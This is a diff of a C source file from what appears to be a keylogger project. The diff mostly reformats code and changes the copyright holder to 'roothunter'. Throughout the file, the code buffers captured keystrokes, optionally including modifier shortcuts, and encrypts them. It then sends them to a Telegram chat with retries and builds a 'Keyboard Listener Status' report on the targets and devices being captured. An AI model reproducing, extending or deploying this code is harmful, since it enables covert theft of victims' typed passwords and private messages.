@@ -1,5 +1,5 @@
 /*
- * Copyright (C) 2026 Antonio Ricciardi
+ * Copyright (C) 2026 roothunter
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -15,7 +15,6 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
-#include "keyboard.h"
 #include "keyboard_output.h"
 #include "../config/config.h"
 #include "../crypto/arena.h"
@@ -23,6 +22,7 @@
 #include "../logging/logging.h"
 #include "../telegram/telegram.h"
 #include "../telegram/telegram_platform.h"
+#include "keyboard.h"
 
 #include <stdint.h>
 #include <stdio.h>
@@ -44,13 +44,12 @@
 #define KEYBOARD_BUFFER_CAPACITY 1024U
 #define KEYBOARD_DEFAULT_FLUSH_MS 3000U
 
-
 typedef struct keyboard_event {
-    struct keyboard_event *next;
-    size_t length;
-    size_t allocation_size;
-    unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
-    unsigned char encrypted_data[];
+  struct keyboard_event *next;
+  size_t length;
+  size_t allocation_size;
+  unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
+  unsigned char encrypted_data[];
 } keyboard_event_t;
 
 static keyboard_event_t *queue_head;
@@ -79,9 +78,8 @@ static HANDLE worker_thread;
 
 static void queue_lock(void) { EnterCriticalSection(&queue_mutex); }
 static void queue_unlock(void) { LeaveCriticalSection(&queue_mutex); }
-static void queue_wait_timeout(DWORD ms)
-{
-    (void)SleepConditionVariableCS(&queue_condition, &queue_mutex, ms);
+static void queue_wait_timeout(DWORD ms) {
+  (void)SleepConditionVariableCS(&queue_condition, &queue_mutex, ms);
 }
 static void queue_signal(void) { WakeConditionVariable(&queue_condition); }
 #else
@@ -91,228 +89,216 @@ static pthread_t worker_thread;
 
 static void queue_lock(void) { (void)pthread_mutex_lock(&queue_mutex); }
 static void queue_unlock(void) { (void)pthread_mutex_unlock(&queue_mutex); }
-static void queue_wait_timeout(unsigned int ms)
-{
-    struct timespec now;
-    clock_gettime(CLOCK_REALTIME, &now);
-    now.tv_sec += (time_t)(ms / 1000);
-    now.tv_nsec += (long)(ms % 1000) * 1000000L;
-    if (now.tv_nsec >= 1000000000L) {
-        now.tv_sec += 1;
-        now.tv_nsec -= 1000000000L;
-    }
-    (void)pthread_cond_timedwait(&queue_condition, &queue_mutex, &now);
+static void queue_wait_timeout(unsigned int ms) {
+  struct timespec now;
+  clock_gettime(CLOCK_REALTIME, &now);
+  now.tv_sec += (time_t)(ms / 1000);
+  now.tv_nsec += (long)(ms % 1000) * 1000000L;
+  if (now.tv_nsec >= 1000000000L) {
+    now.tv_sec += 1;
+    now.tv_nsec -= 1000000000L;
+  }
+  (void)pthread_cond_timedwait(&queue_condition, &queue_mutex, &now);
 }
 static void queue_signal(void) { (void)pthread_cond_signal(&queue_condition); }
 #endif
 
-static uint64_t get_monotonic_ms(void)
-{
+static uint64_t get_monotonic_ms(void) {
 #ifdef _WIN32
-    return GetTickCount64();
+  return GetTickCount64();
 #else
-    struct timespec now;
-    if (clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
-        return (uint64_t)now.tv_sec * 1000 + (uint64_t)now.tv_nsec / 1000000;
-    }
-    return 0;
+  struct timespec now;
+  if (clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
+    return (uint64_t)now.tv_sec * 1000 + (uint64_t)now.tv_nsec / 1000000;
+  }
+  return 0;
 #endif
 }
 
-static void retry_delay(size_t attempt)
-{
-    size_t delay = retry_delay_ms > 60000 / attempt
-        ? 60000 : retry_delay_ms * attempt;
+static void retry_delay(size_t attempt) {
+  size_t delay =
+      retry_delay_ms > 60000 / attempt ? 60000 : retry_delay_ms * attempt;
 #ifdef _WIN32
-    Sleep((DWORD)delay);
+  Sleep((DWORD)delay);
 #else
-    struct timespec duration = {
-        .tv_sec = (time_t)(delay / 1000),
-        .tv_nsec = (long)(delay % 1000) * 1000000L
-    };
-    while (nanosleep(&duration, &duration) != 0 && errno == EINTR) {
-    }
+  struct timespec duration = {.tv_sec = (time_t)(delay / 1000),
+                              .tv_nsec = (long)(delay % 1000) * 1000000L};
+  while (nanosleep(&duration, &duration) != 0 && errno == EINTR) {
+  }
 #endif
 }
 
 static c2t_arena_t keyboard_arena;
 
-static void enqueue_locked(const void *data, size_t length)
-{
-    if (length == 0)
-        return;
+static void enqueue_locked(const void *data, size_t length) {
+  if (length == 0)
+    return;
 
-    size_t allocation_size = sizeof(keyboard_event_t) + length;
-    if (maximum_queue_bytes > 0 &&
-        queue_bytes + allocation_size > maximum_queue_bytes) {
-        c2t_log_warning("keyboard", "Queue byte limit exceeded; discarding event");
-        return;
-    }
-    if (maximum_queue_items > 0 && queue_items >= maximum_queue_items) {
-        c2t_log_warning("keyboard", "Queue item limit exceeded; discarding event");
-        return;
-    }
+  size_t allocation_size = sizeof(keyboard_event_t) + length;
+  if (maximum_queue_bytes > 0 &&
+      queue_bytes + allocation_size > maximum_queue_bytes) {
+    c2t_log_warning("keyboard", "Queue byte limit exceeded; discarding event");
+    return;
+  }
+  if (maximum_queue_items > 0 && queue_items >= maximum_queue_items) {
+    c2t_log_warning("keyboard", "Queue item limit exceeded; discarding event");
+    return;
+  }
 
-    keyboard_event_t *event = (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
-    if (!event) {
-        if (queue_items == 0) {
-            c2t_arena_reset(&keyboard_arena);
-            event = (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
-        }
+  keyboard_event_t *event =
+      (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
+  if (!event) {
+    if (queue_items == 0) {
+      c2t_arena_reset(&keyboard_arena);
+      event =
+          (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
     }
-    if (!event) {
-        event = malloc(allocation_size);
-    }
-    if (!event) {
-        c2t_log_error("keyboard", "Out of memory allocating keyboard event");
-        return;
-    }
+  }
+  if (!event) {
+    event = malloc(allocation_size);
+  }
+  if (!event) {
+    c2t_log_error("keyboard", "Out of memory allocating keyboard event");
+    return;
+  }
 
-    event->next = nullptr;
-    event->length = length;
-    event->allocation_size = allocation_size;
+  event->next = nullptr;
+  event->length = length;
+  event->allocation_size = allocation_size;
 
-    if (!c2t_crypto_get_random_bytes(event->nonce, C2T_CRYPTO_NONCE_SIZE)) {
-        c2t_log_error("keyboard", "Failed to generate nonce for keyboard event");
-        if ((unsigned char *)event >= keyboard_arena.buffer &&
-            (unsigned char *)event < keyboard_arena.buffer + keyboard_arena.capacity) {
-            c2t_secure_zero(event, allocation_size);
-        } else {
-            c2t_secure_zero(event, allocation_size);
-            free(event);
-        }
-        return;
-    }
-    if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
-        c2t_log_error("keyboard", "Encryption failed for keyboard payload");
-        if ((unsigned char *)event >= keyboard_arena.buffer &&
-            (unsigned char *)event < keyboard_arena.buffer + keyboard_arena.capacity) {
-            c2t_secure_zero(event, allocation_size);
-        } else {
-            c2t_secure_zero(event, allocation_size);
-            free(event);
-        }
-        return;
-    }
-
-    if (queue_tail) {
-        queue_tail->next = event;
+  if (!c2t_crypto_get_random_bytes(event->nonce, C2T_CRYPTO_NONCE_SIZE)) {
+    c2t_log_error("keyboard", "Failed to generate nonce for keyboard event");
+    if ((unsigned char *)event >= keyboard_arena.buffer &&
+        (unsigned char *)event <
+            keyboard_arena.buffer + keyboard_arena.capacity) {
+      c2t_secure_zero(event, allocation_size);
     } else {
-        queue_head = event;
+      c2t_secure_zero(event, allocation_size);
+      free(event);
     }
-    queue_tail = event;
-    queue_bytes += allocation_size;
-    ++queue_items;
+    return;
+  }
+  if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
+    c2t_log_error("keyboard", "Encryption failed for keyboard payload");
+    if ((unsigned char *)event >= keyboard_arena.buffer &&
+        (unsigned char *)event <
+            keyboard_arena.buffer + keyboard_arena.capacity) {
+      c2t_secure_zero(event, allocation_size);
+    } else {
+      c2t_secure_zero(event, allocation_size);
+      free(event);
+    }
+    return;
+  }
 
-    queue_signal();
+  if (queue_tail) {
+    queue_tail->next = event;
+  } else {
+    queue_head = event;
+  }
+  queue_tail = event;
+  queue_bytes += allocation_size;
+  ++queue_items;
+
+  queue_signal();
 }
 
-static void flush_buffer_locked(void)
-{
-    if (text_buffer_len == 0)
-        return;
+static void flush_buffer_locked(void) {
+  if (text_buffer_len == 0)
+    return;
 
-    enqueue_locked(text_buffer, text_buffer_len);
-    c2t_secure_zero(text_buffer, sizeof(text_buffer));
-    text_buffer_len = 0;
-    last_key_time_ms = 0;
+  enqueue_locked(text_buffer, text_buffer_len);
+  c2t_secure_zero(text_buffer, sizeof(text_buffer));
+  text_buffer_len = 0;
+  last_key_time_ms = 0;
 }
 
-void keyboard_output_flush(void)
-{
-    queue_lock();
-    flush_buffer_locked();
-    queue_unlock();
+void keyboard_output_flush(void) {
+  queue_lock();
+  flush_buffer_locked();
+  queue_unlock();
 }
 
-void keyboard_output_append(const char *text, size_t length)
-{
-    if (!text || length == 0 || keyboard_paused)
-        return;
+void keyboard_output_append(const char *text, size_t length) {
+  if (!text || length == 0 || keyboard_paused)
+    return;
 
-    queue_lock();
-    total_keyboard_keystrokes += length;
+  queue_lock();
+  total_keyboard_keystrokes += length;
 
-    for (size_t i = 0; i < length; i++) {
-        char ch = text[i];
-        if (text_buffer_len + 1 >= KEYBOARD_BUFFER_CAPACITY) {
-            flush_buffer_locked();
-        }
-
-        text_buffer[text_buffer_len++] = ch;
-
-        if (ch == '\n') {
-            flush_buffer_locked();
-        }
+  for (size_t i = 0; i < length; i++) {
+    char ch = text[i];
+    if (text_buffer_len + 1 >= KEYBOARD_BUFFER_CAPACITY) {
+      flush_buffer_locked();
     }
 
+    text_buffer[text_buffer_len++] = ch;
+
+    if (ch == '\n') {
+      flush_buffer_locked();
+    }
+  }
+
+  last_key_time_ms = get_monotonic_ms();
+  queue_signal();
+  queue_unlock();
+}
+
+void keyboard_output_backspace(void) {
+  if (keyboard_paused)
+    return;
+
+  queue_lock();
+  total_keyboard_keystrokes++;
+  if (text_buffer_len > 0) {
+    size_t pos = text_buffer_len;
+    --pos;
+    while (pos > 0 && ((unsigned char)text_buffer[pos] & 0xC0) == 0x80) {
+      --pos;
+    }
+    for (size_t i = pos; i < text_buffer_len; i++) {
+      text_buffer[i] = '\0';
+    }
+    text_buffer_len = pos;
     last_key_time_ms = get_monotonic_ms();
-    queue_signal();
-    queue_unlock();
-}
-
-void keyboard_output_backspace(void)
-{
-    if (keyboard_paused)
-        return;
-
-    queue_lock();
-    total_keyboard_keystrokes++;
-    if (text_buffer_len > 0) {
-        size_t pos = text_buffer_len;
-        --pos;
-        while (pos > 0 && ((unsigned char)text_buffer[pos] & 0xC0) == 0x80) {
-            --pos;
-        }
-        for (size_t i = pos; i < text_buffer_len; i++) {
-            text_buffer[i] = '\0';
-        }
-        text_buffer_len = pos;
-        last_key_time_ms = get_monotonic_ms();
-    }
-    queue_unlock();
+  }
+  queue_unlock();
 }
 
 static volatile int keyboard_shortcuts_enabled = 0;
 
-int keyboard_get_shortcuts_enabled(void)
-{
-    return keyboard_shortcuts_enabled;
+int keyboard_get_shortcuts_enabled(void) { return keyboard_shortcuts_enabled; }
+
+void keyboard_set_shortcuts_enabled(int enabled) {
+  keyboard_shortcuts_enabled = enabled ? 1 : 0;
 }
 
-void keyboard_set_shortcuts_enabled(int enabled)
-{
-    keyboard_shortcuts_enabled = enabled ? 1 : 0;
-}
-
-int keyboard_toggle_shortcuts(void)
-{
-    keyboard_shortcuts_enabled = !keyboard_shortcuts_enabled;
-    return keyboard_shortcuts_enabled;
+int keyboard_toggle_shortcuts(void) {
+  keyboard_shortcuts_enabled = !keyboard_shortcuts_enabled;
+  return keyboard_shortcuts_enabled;
 }
 
 static volatile int keyboard_format_mode = KEYBOARD_MODE_CODE;
 
-static void deliver_event(const keyboard_event_t *event)
-{
-    for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
-        if (telegram_send_encrypted_data(event->encrypted_data, event->length,
-                                         event->nonce, C2T_KEYBOARD_MIME_TYPE, nullptr)) {
-            queue_lock();
-            total_keyboard_bytes += event->length;
-            queue_unlock();
-            return;
-        }
-        if (attempt < delivery_attempts) {
-            c2t_log_warning("keyboard",
-                            "Delivery attempt %llu/%llu failed; retrying",
-                            (unsigned long long)attempt,
-                            (unsigned long long)delivery_attempts);
-            retry_delay(attempt);
-        }
+static void deliver_event(const keyboard_event_t *event) {
+  for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
+    if (telegram_send_encrypted_data(event->encrypted_data, event->length,
+                                     event->nonce, C2T_KEYBOARD_MIME_TYPE,
+                                     nullptr)) {
+      queue_lock();
+      total_keyboard_bytes += event->length;
+      queue_unlock();
+      return;
     }
-    c2t_log_error("keyboard", "Keyboard delivery failed after %llu attempts",
-                  (unsigned long long)delivery_attempts);
+    if (attempt < delivery_attempts) {
+      c2t_log_warning("keyboard", "Delivery attempt %llu/%llu failed; retrying",
+                      (unsigned long long)attempt,
+                      (unsigned long long)delivery_attempts);
+      retry_delay(attempt);
+    }
+  }
+  c2t_log_error("keyboard", "Keyboard delivery failed after %llu attempts",
+                (unsigned long long)delivery_attempts);
 }
 
 #ifdef _WIN32
@@ -321,255 +307,246 @@ static DWORD WINAPI delivery_worker([[maybe_unused]] void *context)
 static void *delivery_worker([[maybe_unused]] void *context)
 #endif
 {
-    for (;;) {
-        queue_lock();
+  for (;;) {
+    queue_lock();
 
-        while (!queue_head && !stopping) {
-            if (text_buffer_len > 0) {
-                uint64_t now = get_monotonic_ms();
-                uint64_t elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
-                if (elapsed >= inactivity_flush_ms) {
-                    flush_buffer_locked();
-                    break;
-                }
-                unsigned int wait_ms = (unsigned int)(inactivity_flush_ms - elapsed);
-                queue_wait_timeout(wait_ms > 0 ? wait_ms : 50);
-                if (text_buffer_len > 0) {
-                    now = get_monotonic_ms();
-                    elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
-                    if (elapsed >= inactivity_flush_ms) {
-                        flush_buffer_locked();
-                        break;
-                    }
-                }
-            } else {
-                queue_wait_timeout(5000);
-            }
+    while (!queue_head && !stopping) {
+      if (text_buffer_len > 0) {
+        uint64_t now = get_monotonic_ms();
+        uint64_t elapsed =
+            (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
+        if (elapsed >= inactivity_flush_ms) {
+          flush_buffer_locked();
+          break;
         }
-
-        if (!queue_head && stopping) {
+        unsigned int wait_ms = (unsigned int)(inactivity_flush_ms - elapsed);
+        queue_wait_timeout(wait_ms > 0 ? wait_ms : 50);
+        if (text_buffer_len > 0) {
+          now = get_monotonic_ms();
+          elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
+          if (elapsed >= inactivity_flush_ms) {
             flush_buffer_locked();
-            if (!queue_head) {
-                queue_unlock();
-                break;
-            }
+            break;
+          }
         }
-
-        keyboard_event_t *event = queue_head;
-        if (event) {
-            queue_head = event->next;
-            if (!queue_head)
-                queue_tail = nullptr;
-            queue_unlock();
-
-            deliver_event(event);
-
-            queue_lock();
-            queue_bytes -= event->allocation_size;
-            --queue_items;
-            if (queue_items == 0) {
-                c2t_arena_reset(&keyboard_arena);
-            }
-            queue_unlock();
-
-            if ((unsigned char *)event >= keyboard_arena.buffer &&
-                (unsigned char *)event < keyboard_arena.buffer + keyboard_arena.capacity) {
-                c2t_secure_zero(event, event->allocation_size);
-            } else {
-                c2t_secure_zero(event, event->allocation_size);
-                free(event);
-            }
-        } else {
-            queue_unlock();
-        }
+      } else {
+        queue_wait_timeout(5000);
+      }
     }
 
-    telegram_http_thread_cleanup();
-#ifdef _WIN32
-    return 0;
-#else
-    return nullptr;
-#endif
-}
-
-int keyboard_is_paused(void)
-{
-    return keyboard_paused;
-}
-
-void keyboard_set_paused(int paused)
-{
-    keyboard_paused = paused;
-}
-
-int keyboard_toggle_paused(void)
-{
-    keyboard_paused = !keyboard_paused;
-    return keyboard_paused;
-}
-
-void keyboard_set_format_mode(int mode)
-{
-    keyboard_format_mode = mode;
-}
-
-int keyboard_get_format_mode(void)
-{
-    return keyboard_format_mode;
-}
-
-void keyboard_get_status_info(char *buffer, size_t max_len)
-{
-    if (!buffer || max_len == 0) return;
-
-    char target[128] = "all";
-    keyboard_get_selected_target(target, sizeof(target));
-    char layout_name[128] = "Auto";
-    keyboard_get_layout(layout_name, sizeof(layout_name));
-    int dev_count = keyboard_get_device_count();
-    int paused = keyboard_is_paused();
-    int mode = keyboard_get_format_mode();
-
-    queue_lock();
-    size_t cur_items = queue_items;
-    size_t cur_bytes = queue_bytes;
-    size_t cur_buf = text_buffer_len;
-    uint64_t tot_bytes = total_keyboard_bytes;
-    uint64_t tot_keys = total_keyboard_keystrokes;
-    queue_unlock();
-
-    char tot_str[64] = {};
-    if (tot_bytes < 1024) {
-        snprintf(tot_str, sizeof(tot_str), "%llu B", (unsigned long long)tot_bytes);
-    } else if (tot_bytes < 1024 * 1024) {
-        snprintf(tot_str, sizeof(tot_str), "%.1f KB (%llu B)", (double)tot_bytes / 1024.0, (unsigned long long)tot_bytes);
-    } else {
-        snprintf(tot_str, sizeof(tot_str), "%.2f MB (%llu bytes)", (double)tot_bytes / (1024.0 * 1024.0), (unsigned long long)tot_bytes);
+    if (!queue_head && stopping) {
+      flush_buffer_locked();
+      if (!queue_head) {
+        queue_unlock();
+        break;
+      }
     }
 
-    snprintf(buffer, max_len,
-             "⌨️ <b>Keyboard Listener Status</b>\n\n"
-             "• <b>Status:</b> %s\n"
-             "• <b>Active Layout:</b> %s\n"
-             "• <b>Shortcuts &amp; Modifiers:</b> %s\n"
-             "• <b>Total Delivered:</b> %s in %llu keystrokes\n"
-             "• <b>Format Mode:</b> %s\n"
-             "• <b>Selected Target:</b> <code>%s</code>\n"
-             "• <b>Detected Devices:</b> %d\n"
-             "• <b>Pending Buffer:</b> %llu bytes\n"
-             "• <b>Delivery Queue:</b> %llu items / %llu bytes\n"
-             "• <b>Inactivity Flush:</b> %llu ms",
-             paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
-             layout_name,
-             keyboard_shortcuts_enabled ? "🟢 <b>ENABLED</b> (Capturing [Ctrl+C], [Alt+...], etc.)" : "⚪ <b>DISABLED</b> (Clean typing text only)",
-             tot_str, (unsigned long long)tot_keys,
-             mode == KEYBOARD_MODE_CODE ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>" : "<code>Raw Plain Text</code>",
-             target,
-             dev_count,
-             (unsigned long long)cur_buf,
-             (unsigned long long)cur_items,
-             (unsigned long long)cur_bytes,
-             (unsigned long long)inactivity_flush_ms);
-}
+    keyboard_event_t *event = queue_head;
+    if (event) {
+      queue_head = event->next;
+      if (!queue_head)
+        queue_tail = nullptr;
+      queue_unlock();
 
-uint64_t keyboard_get_total_bytes(void)
-{
-    queue_lock();
-    uint64_t val = total_keyboard_bytes;
-    queue_unlock();
-    return val;
-}
+      deliver_event(event);
 
-uint64_t keyboard_get_total_keystrokes(void)
-{
-    queue_lock();
-    uint64_t val = total_keyboard_keystrokes;
-    queue_unlock();
-    return val;
-}
+      queue_lock();
+      queue_bytes -= event->allocation_size;
+      --queue_items;
+      if (queue_items == 0) {
+        c2t_arena_reset(&keyboard_arena);
+      }
+      queue_unlock();
 
-
-int keyboard_output_init(void)
-{
-    if (worker_started)
-        return 1;
-    if (!c2t_crypto_init()) {
-        c2t_log_error("keyboard", "Unable to initialize crypto session key");
-        return 0;
-    }
-
-    maximum_queue_bytes = c2t_config_get()->queue_max_bytes;
-    maximum_queue_items = c2t_config_get()->queue_max_items;
-    delivery_attempts = c2t_config_get()->delivery_attempts;
-    retry_delay_ms = c2t_config_get()->retry_delay_ms;
-    inactivity_flush_ms = c2t_config_get()->keyboard_flush_ms > 0
-        ? c2t_config_get()->keyboard_flush_ms : KEYBOARD_DEFAULT_FLUSH_MS;
-    keyboard_shortcuts_enabled = c2t_config_get()->keyboard_shortcuts;
-    stopping = 0;
-    keyboard_paused = 0;
-    text_buffer_len = 0;
-    last_key_time_ms = 0;
-
-    (void)c2t_arena_init(&keyboard_arena, 64U * 1024U);
-
-#ifdef _WIN32
-    InitializeCriticalSection(&queue_mutex);
-    InitializeConditionVariable(&queue_condition);
-    worker_thread = CreateThread(nullptr, 0, delivery_worker, nullptr, 0, nullptr);
-    worker_started = worker_thread != nullptr;
-#else
-    pthread_attr_t attr;
-    pthread_attr_init(&attr);
-    pthread_attr_setstacksize(&attr, 128 * 1024);
-    worker_started = pthread_create(&worker_thread, &attr, delivery_worker,
-                                    nullptr) == 0;
-    pthread_attr_destroy(&attr);
-#endif
-
-    if (!worker_started) {
-        c2t_log_error("keyboard", "Unable to start keyboard delivery worker");
-        c2t_arena_destroy(&keyboard_arena);
-#ifdef _WIN32
-        DeleteCriticalSection(&queue_mutex);
-#endif
-    }
-    return worker_started;
-}
-
-void keyboard_output_cleanup(void)
-{
-    if (!worker_started)
-        return;
-
-    queue_lock();
-    stopping = 1;
-    flush_buffer_locked();
-    queue_signal();
-    queue_unlock();
-
-#ifdef _WIN32
-    WaitForSingleObject(worker_thread, INFINITE);
-    CloseHandle(worker_thread);
-    DeleteCriticalSection(&queue_mutex);
-#else
-    (void)pthread_join(worker_thread, nullptr);
-#endif
-
-    while (queue_head) {
-        keyboard_event_t *event = queue_head;
-        queue_head = event->next;
+      if ((unsigned char *)event >= keyboard_arena.buffer &&
+          (unsigned char *)event <
+              keyboard_arena.buffer + keyboard_arena.capacity) {
         c2t_secure_zero(event, event->allocation_size);
-        if ((unsigned char *)event < keyboard_arena.buffer ||
-            (unsigned char *)event >= keyboard_arena.buffer + keyboard_arena.capacity) {
-            free(event);
-        }
+      } else {
+        c2t_secure_zero(event, event->allocation_size);
+        free(event);
+      }
+    } else {
+      queue_unlock();
     }
+  }
+
+  telegram_http_thread_cleanup();
+#ifdef _WIN32
+  return 0;
+#else
+  return nullptr;
+#endif
+}
+
+int keyboard_is_paused(void) { return keyboard_paused; }
+
+void keyboard_set_paused(int paused) { keyboard_paused = paused; }
+
+int keyboard_toggle_paused(void) {
+  keyboard_paused = !keyboard_paused;
+  return keyboard_paused;
+}
+
+void keyboard_set_format_mode(int mode) { keyboard_format_mode = mode; }
+
+int keyboard_get_format_mode(void) { return keyboard_format_mode; }
+
+void keyboard_get_status_info(char *buffer, size_t max_len) {
+  if (!buffer || max_len == 0)
+    return;
+
+  char target[128] = "all";
+  keyboard_get_selected_target(target, sizeof(target));
+  char layout_name[128] = "Auto";
+  keyboard_get_layout(layout_name, sizeof(layout_name));
+  int dev_count = keyboard_get_device_count();
+  int paused = keyboard_is_paused();
+  int mode = keyboard_get_format_mode();
+
+  queue_lock();
+  size_t cur_items = queue_items;
+  size_t cur_bytes = queue_bytes;
+  size_t cur_buf = text_buffer_len;
+  uint64_t tot_bytes = total_keyboard_bytes;
+  uint64_t tot_keys = total_keyboard_keystrokes;
+  queue_unlock();
+
+  char tot_str[64] = {};
+  if (tot_bytes < 1024) {
+    snprintf(tot_str, sizeof(tot_str), "%llu B", (unsigned long long)tot_bytes);
+  } else if (tot_bytes < 1024 * 1024) {
+    snprintf(tot_str, sizeof(tot_str), "%.1f KB (%llu B)",
+             (double)tot_bytes / 1024.0, (unsigned long long)tot_bytes);
+  } else {
+    snprintf(tot_str, sizeof(tot_str), "%.2f MB (%llu bytes)",
+             (double)tot_bytes / (1024.0 * 1024.0),
+             (unsigned long long)tot_bytes);
+  }
+
+  snprintf(buffer, max_len,
+           "⌨️ <b>Keyboard Listener Status</b>\n\n"
+           "• <b>Status:</b> %s\n"
+           "• <b>Active Layout:</b> %s\n"
+           "• <b>Shortcuts &amp; Modifiers:</b> %s\n"
+           "• <b>Total Delivered:</b> %s in %llu keystrokes\n"
+           "• <b>Format Mode:</b> %s\n"
+           "• <b>Selected Target:</b> <code>%s</code>\n"
+           "• <b>Detected Devices:</b> %d\n"
+           "• <b>Pending Buffer:</b> %llu bytes\n"
+           "• <b>Delivery Queue:</b> %llu items / %llu bytes\n"
+           "• <b>Inactivity Flush:</b> %llu ms",
+           paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
+           layout_name,
+           keyboard_shortcuts_enabled
+               ? "🟢 <b>ENABLED</b> (Capturing [Ctrl+C], [Alt+...], etc.)"
+               : "⚪ <b>DISABLED</b> (Clean typing text only)",
+           tot_str, (unsigned long long)tot_keys,
+           mode == KEYBOARD_MODE_CODE
+               ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>"
+               : "<code>Raw Plain Text</code>",
+           target, dev_count, (unsigned long long)cur_buf,
+           (unsigned long long)cur_items, (unsigned long long)cur_bytes,
+           (unsigned long long)inactivity_flush_ms);
+}
+
+uint64_t keyboard_get_total_bytes(void) {
+  queue_lock();
+  uint64_t val = total_keyboard_bytes;
+  queue_unlock();
+  return val;
+}
+
+uint64_t keyboard_get_total_keystrokes(void) {
+  queue_lock();
+  uint64_t val = total_keyboard_keystrokes;
+  queue_unlock();
+  return val;
+}
+
+int keyboard_output_init(void) {
+  if (worker_started)
+    return 1;
+  if (!c2t_crypto_init()) {
+    c2t_log_error("keyboard", "Unable to initialize crypto session key");
+    return 0;
+  }
+
+  maximum_queue_bytes = c2t_config_get()->queue_max_bytes;
+  maximum_queue_items = c2t_config_get()->queue_max_items;
+  delivery_attempts = c2t_config_get()->delivery_attempts;
+  retry_delay_ms = c2t_config_get()->retry_delay_ms;
+  inactivity_flush_ms = c2t_config_get()->keyboard_flush_ms > 0
+                            ? c2t_config_get()->keyboard_flush_ms
+                            : KEYBOARD_DEFAULT_FLUSH_MS;
+  keyboard_shortcuts_enabled = c2t_config_get()->keyboard_shortcuts;
+  stopping = 0;
+  keyboard_paused = 0;
+  text_buffer_len = 0;
+  last_key_time_ms = 0;
+
+  (void)c2t_arena_init(&keyboard_arena, 64U * 1024U);
+
+#ifdef _WIN32
+  InitializeCriticalSection(&queue_mutex);
+  InitializeConditionVariable(&queue_condition);
+  worker_thread =
+      CreateThread(nullptr, 0, delivery_worker, nullptr, 0, nullptr);
+  worker_started = worker_thread != nullptr;
+#else
+  pthread_attr_t attr;
+  pthread_attr_init(&attr);
+  pthread_attr_setstacksize(&attr, 128 * 1024);
+  worker_started =
+      pthread_create(&worker_thread, &attr, delivery_worker, nullptr) == 0;
+  pthread_attr_destroy(&attr);
+#endif
+
+  if (!worker_started) {
+    c2t_log_error("keyboard", "Unable to start keyboard delivery worker");
     c2t_arena_destroy(&keyboard_arena);
-    queue_tail = nullptr;
-    queue_bytes = 0;
-    queue_items = 0;
-    worker_started = 0;
+#ifdef _WIN32
+    DeleteCriticalSection(&queue_mutex);
+#endif
+  }
+  return worker_started;
+}
+
+void keyboard_output_cleanup(void) {
+  if (!worker_started)
+    return;
+
+  queue_lock();
+  stopping = 1;
+  flush_buffer_locked();
+  queue_signal();
+  queue_unlock();
+
+#ifdef _WIN32
+  WaitForSingleObject(worker_thread, INFINITE);
+  CloseHandle(worker_thread);
+  DeleteCriticalSection(&queue_mutex);
+#else
+  (void)pthread_join(worker_thread, nullptr);
+#endif
+
+  while (queue_head) {
+    keyboard_event_t *event = queue_head;
+    queue_head = event->next;
+    c2t_secure_zero(event, event->allocation_size);
+    if ((unsigned char *)event < keyboard_arena.buffer ||
+        (unsigned char *)event >=
+            keyboard_arena.buffer + keyboard_arena.capacity) {
+      free(event);
+    }
+  }
+  c2t_arena_destroy(&keyboard_arena);
+  queue_tail = nullptr;
+  queue_bytes = 0;
+  queue_items = 0;
+  worker_started = 0;
 #if defined(__GLIBC__) && !defined(_WIN32)
-    malloc_trim(0);
+  malloc_trim(0);
 #endif
 }
